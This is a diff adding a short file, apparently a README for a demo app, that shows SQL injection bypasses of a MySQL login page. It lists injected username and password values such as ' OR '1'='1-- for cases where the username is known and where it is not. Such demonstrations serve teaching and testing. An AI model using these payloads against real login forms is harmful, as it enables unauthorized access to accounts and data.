@@ -1,0 +1,28 @@
+Demonstration of SQL-Injection
+Registration Details :
+Username : "Abhiram@178"
+Password : "Abhiram"
+Below Test Cases are the demonstration for the SQL injection attack in the MySQL Database to by pass the Login Page with injected SQL Queries
+These Below Test Cases are only work for the Username "Abhiram@178" if you want to change the command then make sure create a new user and replace your username in place of "Abhiram@178"
+
+Test Case-1 : 
+
+When Username is known and Password is not Known to the attacker
+Username : Abhiram@178' OR '1'='1-- (or) Abhiram@178' OR '1'='1
+Password : anything (or) leave it blank 
+                    (or)
+Username : Abhiram@178' OR '1'='1-- (or) Abhiram@178' OR '1'='1
+Password : Abhiram@178' OR '1'='1-- (or) Abhiram@178' OR '1'='1
+                   (or)
+Username : Abhiram@178' OR '1'='1--
+Password : ' OR '1'='1 (or) ' OR '1'='1--
+
+
+Test Case-2 :
+
+When Username and Password is not Known to the attacker
+Username : ' OR '1'='1--
+Password : ' OR '1'='1
+                     (or)
+Username : ' OR '1'='1
+Password : ' OR '1'='1
